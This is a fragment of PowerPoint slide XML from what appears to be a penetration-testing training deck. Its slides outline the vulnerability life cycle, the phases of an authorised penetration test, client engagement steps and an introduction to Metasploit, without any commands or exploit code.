            <a:pPr marL="568325" lvl="1" indent="-247650" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>With the vulnerability assessment and penetration testing done in the right way, organizations can ensure that they have put in place the right security controls, and they are functioning as expected!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;336;p40">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C92EDE15-3B99-2958-A14E-9B3ECC823DC4}"/>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Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28854002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7927089-9DC6-D0E3-8530-D8A23B4094BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="0" indent="-742950">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Discovery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Vul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Found by researcher</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="0" indent="-742950">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Disclosure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Vul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Disclosed (Privately or Publicly)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="0" indent="-742950">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Analysis </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>– Is it Exploitable ? / Remotely ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="0" indent="-742950">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Exploit Development</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> – Let’s Write code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="0" indent="-742950">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> – Let’s tests the exploit in diff systems with existing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>vul</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="0" indent="-742950">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Release </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>– Let’s Release the exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-247650" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;347;p41">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{373F83FE-815B-7F24-09E3-2D1F7FDC8494}"/>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Need of PT Framework: Vulnerability Life Cycle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="305627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35FB2FA-F462-36A5-7074-8D737FA8897B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" lvl="0" indent="-514350">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Information Gathering: Scan and look for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Vul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>MissConfig</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="274320" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>	- Active and Passive Info-Gathering.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" lvl="0" indent="-514350">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Enumeration: Filter out </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>MissConfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> or outdated version</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="274320" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>	- Services, users, shares, DNS Entries, etc.. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" lvl="0" indent="-514350">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Gaining Access: try entering into the system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="274320" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>	- Bypass security controls; IDS, IPS, Firewall, </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" lvl="0" indent="-514350">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Privilege Escalation: Be limitless with Admin Privileges </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="274320" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>	- full control of the system, </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" lvl="0" indent="-514350">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Maintaining Access: Persistent Connection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="274320" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>	- backdoor, malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" lvl="0" indent="-514350">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Covering Trace: clear records, delete temp created accounts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="274320" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>	- delete tools, exploits, backdoors, etc.. (as per the agreement)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;358;p42">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60B6B35B-14CB-BDEE-B9F6-9A0DA642FC0A}"/>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Need of PT Framework: Penetration Testing Cycle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35930547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8802AA-5164-002C-1435-659158198CBA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;369;p43">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DCC5834-04C5-65F8-A509-5C17E103C2C6}"/>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Why Metasploit?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9D89425-2495-AC13-B906-14946B8D7D3A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="2812027"/>
            <a:ext cx="7886699" cy="3533594"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15376177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2453310-1F46-2572-5854-BD3C5A06F387}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">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Talk to the client and discuss the needs to be addressed during the testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">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Prepare and sign NDA documents with the client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">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Organize an ethical hacking team and prepare the schedule for testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">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Conduct the test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">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Analyze the result of the testing and prepare a report</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">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Present the report findings to the client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Support IT Team for patch management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;381;p44">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C2A3355-5C6E-79E6-0646-E8DE076399AB}"/>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Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Security Audit Framework</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40651154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395B51B-B2D8-1F89-4A85-63CEC259C4F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Visit the Rapid7 Metasploit download page.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
